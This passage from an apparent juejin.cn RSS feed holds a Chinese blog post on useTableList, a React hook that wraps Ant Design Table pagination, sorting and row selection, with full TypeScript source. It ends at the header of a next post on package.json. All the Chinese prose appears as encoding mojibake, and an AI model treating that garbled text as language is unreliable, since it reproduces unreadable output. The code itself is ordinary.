.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ä¸­åå°é¡¹ç›®ä¸­ï¼Œæœ€å¸¸è§çš„é¡µé¢ä¸æ˜¯è¡¨å•ï¼Œè€Œæ˜¯åˆ—è¡¨é¡µã€‚<br/>
çœŸæ­£æ¶ˆè€—æ—¶é—´çš„ï¼Œå¾€å¾€ä¸æ˜¯ä¸šåŠ¡å¤æ‚åº¦ï¼Œè€Œæ˜¯åˆ†é¡µã€æ’åºã€loadingã€æŸ¥è¯¢å‚æ•°åŒæ­¥è¿™äº›é‡å¤åŠ³åŠ¨ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« åˆ†äº«æˆ‘åœ¨é¡¹ç›®ä¸­å°è£…çš„ä¸€ä¸ª Hook â€”â€” <strong>useTableList</strong>ï¼Œç”¨äºç»Ÿä¸€ç®¡ç† Ant Design Table çš„åˆ—è¡¨è¡Œä¸ºã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆè¦å°è£…è¡¨æ ¼ Hookï¼Ÿ</h2>
<p>åœ¨æ²¡æœ‰å°è£…ä¹‹å‰ï¼Œä¸€ä¸ªåˆ—è¡¨é¡µé€šå¸¸è¦å¤„ç†ï¼š</p>
<ul>
<li>loading çŠ¶æ€</li>
<li>åˆ†é¡µ / é¡µç åŒæ­¥</li>
<li>æŸ¥è¯¢å‚æ•°åˆå¹¶</li>
<li>è¡¨æ ¼æ’åºæ˜ å°„</li>
<li>rowSelection ç®¡ç†</li>
<li>search / refresh / reset è¡Œä¸ºåŒºåˆ†</li>
</ul>
<p>ç»“æœå°±æ˜¯ï¼š</p>
<p>ğŸ‘‰ æ¯ä¸ªåˆ—è¡¨é¡µå‡ ä¹éƒ½åœ¨å¤åˆ¶ç²˜è´´ï¼Œè€Œä¸” bug ç‰¹åˆ«å®¹æ˜“é›†ä¸­åœ¨è¿™äº›åœ°æ–¹ã€‚</p>
<p>æ‰€ä»¥æˆ‘ç»™è‡ªå·±å®šäº†ä¸€ä¸ªç›®æ ‡ï¼š</p>
<blockquote>
<p>åˆ—è¡¨é¡µåªå…³å¿ƒï¼šè¡¨å• + columns + ä¸šåŠ¡æ“ä½œ<br/>
å…¶ä½™å…¨éƒ¨äº¤ç»™ Hookã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">äºŒã€è®¾è®¡ç›®æ ‡</h2>
<ul>
<li>âœ… æ•°æ®è¯·æ±‚æ”¶æ•›åˆ°ä¸€ä¸ªå…¥å£</li>
<li>âœ… è¡¨æ ¼è¡Œä¸ºï¼ˆåˆ†é¡µ / æ’åºï¼‰å†…èš</li>
<li>âœ… å¯¹å¤–æš´éœ²è¯­ä¹‰æ¸…æ™°çš„ API</li>
<li>âœ… æœ€å¤§é™åº¦è´´åˆ antd Table</li>
<li>âœ… å¯ä½œä¸ºé¡¹ç›®çº§åŸºç¡€è®¾æ–½</li>
</ul>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€å¯¹å¤– API è®¾è®¡</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> {
  queryParams,
  search,
  refresh,
  reset,
  selectedRowKeys,
  tableProps
} = <span class="hljs-title function_">useTableList</span>(getListApi, { <span class="hljs-attr">rowSelection</span>: <span class="hljs-literal">true</span> })
</code></pre>
<h3 data-id="heading-3">search â€”â€” æŸ¥è¯¢ï¼ˆå›åˆ°ç¬¬ä¸€é¡µï¼‰</h3>
<p>ç”¨äºè¡¨å•æœç´¢ / æ¡ä»¶å˜åŒ–ã€‚</p>
<h3 data-id="heading-4">refresh â€”â€” åˆ·æ–°å½“å‰é¡µ</h3>
<p>ç”¨äºæ–°å¢ / åˆ é™¤ / ä¿®æ”¹ä¹‹åã€‚</p>
<h3 data-id="heading-5">reset â€”â€” é‡ç½®æ¡ä»¶</h3>
<p>ç”¨äºé‡ç½®æŒ‰é’®ã€‚</p>
<h3 data-id="heading-6">selectedRowKeys â€”â€” æ‰¹é‡æ“ä½œèƒ½åŠ›åŸºç¡€</h3>
<h3 data-id="heading-7">tableProps â€”â€” ç›´æ¥ä¼ ç»™ antd Table</h3>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Table</span> rowKey=<span class="hljs-string">"id"</span> columns={columns} {...tableProps} /&gt;
</code></pre>
<hr/>
<h2 data-id="heading-8">å››ã€å…¨å±€é…ç½®èƒ½åŠ›</h2>
<p>è§£å†³ä¸åŒåç«¯å­—æ®µä¸ç»Ÿä¸€çš„é—®é¢˜ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title function_">configureTableOption</span>({
  <span class="hljs-attr">pageSize</span>: <span class="hljs-number">20</span>,
  <span class="hljs-attr">sortField</span>: [<span class="hljs-string">'orderType'</span>, <span class="hljs-string">'orderField'</span>],
  <span class="hljs-attr">sortOrder</span>: [<span class="hljs-string">'ASC'</span>, <span class="hljs-string">'DESC'</span>]
})
</code></pre>
<hr/>
<h2 data-id="heading-9">äº”ã€æ ¸å¿ƒå®ç°æ€è·¯</h2>
<h3 data-id="heading-10">1ï¸âƒ£ å•ä¸€æ•°æ®å…¥å£</h3>
<p>æ‰€æœ‰è¡Œä¸ºæœ€ç»ˆéƒ½ä¼šèµ°ï¼š</p>
<ul>
<li>search</li>
<li>refresh</li>
<li>reset</li>
<li>è¡¨æ ¼åˆ†é¡µ / æ’åº</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchList</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">params</span>) =&gt; { ... }
</code></pre>
<p>è¿™æ˜¯æ•´ä¸ª Hook ç¨³å®šæ€§çš„æ ¸å¿ƒã€‚</p>
<hr/>
<h3 data-id="heading-11">2ï¸âƒ£ æŸ¥è¯¢å‚æ•°æ˜¯å”¯ä¸€çœŸç›¸</h3>
<p>åˆ†é¡µã€æ’åºã€æ¡ä»¶éƒ½æ”¶æ•›åœ¨ queryParams ä¸­ï¼Œé¿å…çŠ¶æ€å‰²è£‚ã€‚</p>
<hr/>
<h3 data-id="heading-12">3ï¸âƒ£ è¡¨æ ¼è¡Œä¸ºå®Œå…¨å†…èš</h3>
<pre><code class="hljs language-ts" lang="ts">onTableChange =&gt; <span class="hljs-title function_">fetchList</span>()
</code></pre>
<p>é¡µé¢å±‚ä¸å†å¤„ç†åˆ†é¡µ / æ’åºç»†èŠ‚ã€‚</p>
<hr/>
<h3 data-id="heading-13">4ï¸âƒ£ rowSelection ç»Ÿä¸€æ‰˜ç®¡</h3>
<p>è®©æ‰¹é‡æ“ä½œå¤©ç„¶å¯æ‰©å±•ã€‚</p>
<hr/>
<h2 data-id="heading-14">å…­ã€å®Œæ•´æºç ï¼ˆuseTableList.tsï¼‰</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> {  <span class="hljs-keyword">type</span> <span class="hljs-title class_">Key</span>, <span class="hljs-keyword">type</span> <span class="hljs-title class_">ReactNode</span>, useState, useEffect, useCallback, useRef, useMemo } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Empty</span>, <span class="hljs-keyword">type</span> <span class="hljs-title class_">TableProps</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">AntdTableProps</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> {
  <span class="hljs-title class_">TablePaginationConfig</span>,
  <span class="hljs-title class_">TableCurrentDataSource</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'antd/es/table/interface'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">QueryParamsData</span> {
  <span class="hljs-attr">pageNo</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">pageSize</span>: <span class="hljs-built_in">number</span>
  orderType?: <span class="hljs-built_in">string</span>
  orderField?: <span class="hljs-built_in">string</span>
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableResponse</span>&lt;T&gt; {
  <span class="hljs-attr">status</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">list</span>: T[]
    <span class="hljs-attr">totalCount</span>: <span class="hljs-built_in">number</span>
  }
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableState</span>&lt;T&gt; {
  <span class="hljs-attr">pagination</span>: <span class="hljs-title class_">TablePaginationConfig</span>
  <span class="hljs-attr">list</span>: T[]
  <span class="hljs-attr">queryParams</span>: <span class="hljs-title class_">QueryParamsData</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableProps</span>&lt;T&gt; {
  <span class="hljs-attr">bordered</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">size</span>: <span class="hljs-string">'middle'</span>
  <span class="hljs-attr">sticky</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">rowSelection</span>: <span class="hljs-title class_">AntdTableProps</span>&lt;T&gt;[<span class="hljs-string">'rowSelection'</span>] | <span class="hljs-literal">undefined</span>
  <span class="hljs-attr">pagination</span>: <span class="hljs-title class_">TablePaginationConfig</span>
  <span class="hljs-attr">loading</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">dataSource</span>: T[]
  <span class="hljs-attr">onChange</span>: <span class="hljs-title class_">AntdTableProps</span>&lt;T&gt;[<span class="hljs-string">'onChange'</span>]
  <span class="hljs-attr">locale</span>: {
    <span class="hljs-attr">emptyText</span>: <span class="hljs-built_in">string</span> | <span class="hljs-title class_">ReactNode</span>
  }
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableListResult</span>&lt;T&gt; {
  <span class="hljs-comment">/** æŸ¥è¯¢å‚æ•° */</span>
  <span class="hljs-attr">queryParams</span>: <span class="hljs-title class_">QueryParamsData</span>
  <span class="hljs-comment">/** æ‰§è¡ŒæŸ¥è¯¢æ–¹æ³• */</span>
  <span class="hljs-attr">search</span>: <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">refresh</span>: <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">reset</span>: <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-comment">/** é€‰ä¸­çš„è¡Œ keys */</span>
  <span class="hljs-attr">selectedRowKeys</span>: <span class="hljs-title class_">Key</span>[]
  <span class="hljs-comment">/** è¡¨æ ¼å±æ€§ */</span>
  <span class="hljs-attr">tableProps</span>: <span class="hljs-title class_">TableProps</span>&lt;T&gt;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">GlobalTableConfig</span> {
  <span class="hljs-attr">sortField</span>: <span class="hljs-built_in">string</span>[]
  <span class="hljs-attr">sortOrder</span>: <span class="hljs-built_in">string</span>[]
  <span class="hljs-attr">pageSize</span>: <span class="hljs-built_in">number</span>
}

<span class="hljs-comment">// é»˜è®¤é…ç½®</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">globalTableConfig</span>: <span class="hljs-title class_">GlobalTableConfig</span> = {
  <span class="hljs-attr">sortField</span>: [<span class="hljs-string">'orderType'</span>, <span class="hljs-string">'orderField'</span>],
  <span class="hljs-attr">sortOrder</span>: [<span class="hljs-string">'ASC'</span>, <span class="hljs-string">'DESC'</span>],
  <span class="hljs-attr">pageSize</span>: <span class="hljs-number">10</span>
}

<span class="hljs-comment">/**
 * é…ç½®å…¨å±€è¡¨æ ¼å‚æ•°
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">config</span>
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">configureTableOption</span>(<span class="hljs-params">config: GlobalTableConfig</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(config).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
    globalTableConfig[key] = config[key]
  })
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> useTableList&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;&gt;(
  <span class="hljs-attr">getRequestFn</span>: <span class="hljs-function">(<span class="hljs-params">data: QueryParamsData</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">TableResponse</span>&lt;T&gt;&gt;,
  initParams = {} <span class="hljs-keyword">as</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;
): <span class="hljs-title class_">TableListResult</span>&lt;T&gt; {
  <span class="hljs-keyword">const</span> { rowSelection, ...restInitParams } = initParams
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PAGE_SIZE</span> = globalTableConfig.<span class="hljs-property">pageSize</span>

  <span class="hljs-keyword">const</span> [state, setState] = useState&lt;<span class="hljs-title class_">TableState</span>&lt;T&gt;&gt;({
    <span class="hljs-attr">pagination</span>: {
      <span class="hljs-attr">showSizeChanger</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">showQuickJumper</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">total</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">pageSize</span>: <span class="hljs-variable constant_">PAGE_SIZE</span>,
      <span class="hljs-attr">current</span>: <span class="hljs-number">1</span>
    },
    <span class="hljs-attr">list</span>: [],
    <span class="hljs-attr">queryParams</span>: {
      <span class="hljs-attr">pageNo</span>: <span class="hljs-number">1</span>,
      <span class="hljs-attr">pageSize</span>: <span class="hljs-variable constant_">PAGE_SIZE</span>,
      ...restInitParams
    }
  })

  <span class="hljs-keyword">const</span> { pagination, list, queryParams } = state
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">pageNo</span>: currentPageNo, <span class="hljs-attr">pageSize</span>: currentPageSize } = queryParams

  <span class="hljs-keyword">const</span> [isLoading, setIsLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>)
  <span class="hljs-keyword">const</span> initialQuery = <span class="hljs-title function_">useRef</span>(queryParams)
  <span class="hljs-keyword">const</span> [selectedRowKeys, setSelectedRowKeys] = useState&lt;<span class="hljs-title class_">Key</span>[]&gt;([])


  <span class="hljs-keyword">const</span> <span class="hljs-attr">rowSelectionData</span>: <span class="hljs-title class_">AntdTableProps</span>&lt;T&gt;[<span class="hljs-string">'rowSelection'</span>] | <span class="hljs-literal">undefined</span> = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (!rowSelection) <span class="hljs-keyword">return</span> <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> {
      selectedRowKeys,
      <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">keys: Key[]</span>) =&gt;</span> <span class="hljs-title function_">setSelectedRowKeys</span>(keys)
    }
  }, [rowSelection, selectedRowKeys])

  <span class="hljs-keyword">const</span> showTotal = <span class="hljs-title function_">useCallback</span>(
    (<span class="hljs-attr">total</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">string</span> =&gt;</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-string">`å…± <span class="hljs-subst">${total}</span> æ¡è®°å½• ç¬¬ <span class="hljs-subst">${currentPageNo}</span>/<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.ceil(total / currentPageSize)}</span> é¡µ `</span>
    },
    [currentPageNo, currentPageSize]
  )

  <span class="hljs-keyword">const</span> fetchList = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-keyword">async</span> (<span class="hljs-attr">params</span>: <span class="hljs-title class_">QueryParamsData</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; =&gt; {
      <span class="hljs-keyword">const</span> { pageNo } = params
      <span class="hljs-title function_">setIsLoading</span>(<span class="hljs-literal">true</span>)
      <span class="hljs-keyword">const</span> queryParamsData = { ...restInitParams, <span class="hljs-attr">pageSize</span>: currentPageSize, ...params }
      <span class="hljs-keyword">if</span> (params.<span class="hljs-property">pageNo</span> === <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>) {
        queryParamsData.<span class="hljs-property">pageNo</span> = <span class="hljs-number">1</span>
      }
      <span class="hljs-keyword">if</span> (params.<span class="hljs-property">pageSize</span> === <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>) {
        queryParamsData.<span class="hljs-property">pageSize</span> = currentPageSize
      }
      <span class="hljs-keyword">const</span> { data } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getRequestFn</span>(queryParamsData)
      <span class="hljs-keyword">const</span> { list = [], totalCount = <span class="hljs-number">0</span> } = data || {}
      rowSelection &amp;&amp; <span class="hljs-title function_">setSelectedRowKeys</span>([])
      <span class="hljs-title function_">setState</span>({
        list,
        <span class="hljs-attr">queryParams</span>: queryParamsData <span class="hljs-keyword">as</span> T &amp; <span class="hljs-title class_">QueryParamsData</span>,
        <span class="hljs-attr">pagination</span>: {
          ...pagination,
          <span class="hljs-attr">current</span>: pageNo,
          <span class="hljs-attr">pageSize</span>: queryParamsData.<span class="hljs-property">pageSize</span>,
          <span class="hljs-attr">total</span>: totalCount
        }
      })

      <span class="hljs-title function_">setIsLoading</span>(<span class="hljs-literal">false</span>)
    },
    [queryParams, restInitParams, rowSelection, currentPageSize, getRequestFn, pagination]
  )

  <span class="hljs-keyword">const</span> search = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-title function_">fetchList</span>({ ...queryParams, ...params, <span class="hljs-attr">pageNo</span>: <span class="hljs-number">1</span> })
    },
    [fetchList, queryParams]
  )

  <span class="hljs-keyword">const</span> refresh = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-title function_">fetchList</span>({ ...queryParams, ...params})
    },
    [fetchList, queryParams]
  )

  <span class="hljs-keyword">const</span> reset = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-title function_">fetchList</span>({ ...params, <span class="hljs-attr">pageSize</span>: currentPageSize, <span class="hljs-attr">pageNo</span>: <span class="hljs-number">1</span> })
    },
    [fetchList, currentPageSize]
  )

  <span class="hljs-keyword">const</span> onTableChange = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params"> pagination: TablePaginationConfig,
      _filters: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;,
      sorter: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;,
      extra: TableCurrentDataSource&lt;<span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> { action } = extra
      <span class="hljs-keyword">if</span> ([<span class="hljs-string">'paginate'</span>, <span class="hljs-string">'sort'</span>].<span class="hljs-title function_">includes</span>(action)) {
        <span class="hljs-keyword">const</span> { current, pageSize } = pagination
        <span class="hljs-keyword">const</span> { field, order } = sorter
        <span class="hljs-keyword">const</span> [orderTypeField, orderFieldName] = globalTableConfig.<span class="hljs-property">sortField</span>
        <span class="hljs-keyword">const</span> [ascValue, descValue] = globalTableConfig.<span class="hljs-property">sortOrder</span>
        <span class="hljs-keyword">const</span> params = {
          ...queryParams,
          [orderTypeField]: order ? (order === <span class="hljs-string">'ascend'</span> ? ascValue : descValue) : <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>,
          [orderFieldName]: field,
          <span class="hljs-attr">pageNo</span>: current,
          <span class="hljs-attr">pageSize</span>: pageSize
        }
        <span class="hljs-title function_">fetchList</span>(params)
      }
    },
    [queryParams, fetchList]
  )

  <span class="hljs-keyword">const</span> <span class="hljs-attr">tableProps</span>: <span class="hljs-title class_">TableProps</span>&lt;T&gt; = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">bordered</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">size</span>: <span class="hljs-string">'middle'</span>,
      <span class="hljs-attr">sticky</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">rowSelection</span>: rowSelectionData,
      <span class="hljs-attr">pagination</span>: { ...pagination, showTotal },
      <span class="hljs-attr">loading</span>: isLoading,
      <span class="hljs-attr">dataSource</span>: list,
      <span class="hljs-attr">onChange</span>: onTableChange,
      <span class="hljs-attr">locale</span>: {
        <span class="hljs-attr">emptyText</span>: isLoading ? <span class="hljs-string">''</span> : <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Empty</span> <span class="hljs-attr">image</span>=<span class="hljs-string">{Empty.PRESENTED_IMAGE_SIMPLE}</span> /&gt;</span></span>
      }
    }
  }, [rowSelectionData, pagination, showTotal, isLoading, list, onTableChange])

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">search</span>(initialQuery.<span class="hljs-property">current</span>)
  }, [])

  <span class="hljs-keyword">return</span> {
    queryParams,
    search,
    refresh,
    reset,
    selectedRowKeys,
    tableProps
  }
}

</code></pre>
<hr/>
<h2 data-id="heading-15">ä¸ƒã€é¡µé¢ä½¿ç”¨ç¤ºä¾‹</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> { tableProps, search, reset, selectedRowKeys } = <span class="hljs-title function_">useTableList</span>(getUserList, {
  <span class="hljs-attr">rowSelection</span>: <span class="hljs-literal">true</span>
})
</code></pre>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Form</span> onFinish={search}&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">htmlType</span>=<span class="hljs-string">"submit"</span>&gt;</span>æœç´¢<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{reset}</span>&gt;</span>é‡ç½®<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span>
&lt;/<span class="hljs-title class_">Form</span>&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Table</span> <span class="hljs-attr">rowKey</span>=<span class="hljs-string">"id"</span> <span class="hljs-attr">columns</span>=<span class="hljs-string">{columns}</span> {<span class="hljs-attr">...tableProps</span>} /&gt;</span></span>
</code></pre>
<hr/>
<h2 data-id="heading-16">å…«ã€æ€»ç»“</h2>
<p>useTableList å¸¦æ¥çš„ä¸æ˜¯â€œå°‘å†™å‡ è¡Œä»£ç â€ï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li>åˆ—è¡¨é¡µå·¥ç¨‹åŒ–</li>
<li>è¡Œä¸ºæ¨¡å‹ç»Ÿä¸€</li>
<li>Bug é›†ä¸­æ”¶å£</li>
<li>å¯æŒç»­æ‰©å±•</li>
</ul>
<p>éå¸¸é€‚åˆä½œä¸ºä¸­åå°é¡¹ç›®çš„åŸºç¡€è®¾æ–½ã€‚</p>
<hr/>
<h2 data-id="heading-17">ä¹ã€åç»­å¯è¿›é˜¶æ–¹å‘</h2>
<ul>
<li>URL åŒæ­¥æŸ¥è¯¢å‚æ•°</li>
<li>å¯¼å‡º / æ‰¹é‡æ“ä½œèƒ½åŠ›</li>
<li>è‡ªåŠ¨è½®è¯¢ / ç¼“å­˜</li>
<li>å‘ ProTable å½¢æ€æ¼”è¿›</li>
</ul>
<hr/>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ç‚¹èµ / æ”¶è— / è¯„è®ºäº¤æµ ğŸ‘
ä¹Ÿæ¬¢è¿åˆ†äº«ä½ ä»¬é¡¹ç›®ä¸­æ˜¯å¦‚ä½•å°è£…åˆ—è¡¨é¡µçš„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[package.json ä¸­çš„ dependencies ä¸ devDependenciesï¼šæ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7592615536384966690</link>    <guid>https://juejin.cn/post/7592615536384966690</guid>    <pubDate>2026-01-08T09:42:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592615536384966690" data-draft-id="7592787377656283170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="package.json ä¸­çš„ dependencies ä¸ devDependenciesï¼šæ·±åº¦è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯,å‰ç«¯æ¡†æ¶,è®¾è®¡æ¨¡å¼"/> <meta itemprop="datePublished" content="2026-01-08T09:42:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§çŸ¥é—²é—²i"/> <meta itemprop="url" content="https://juejin.cn/user/3799545205237111"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            package.json ä¸­çš„ dependencies ä¸ devDependenciesï¼šæ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3799545205237111/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§çŸ¥é—²é—²i
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:42:46.000Z" title="Thu Jan 08 2026 09:42:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
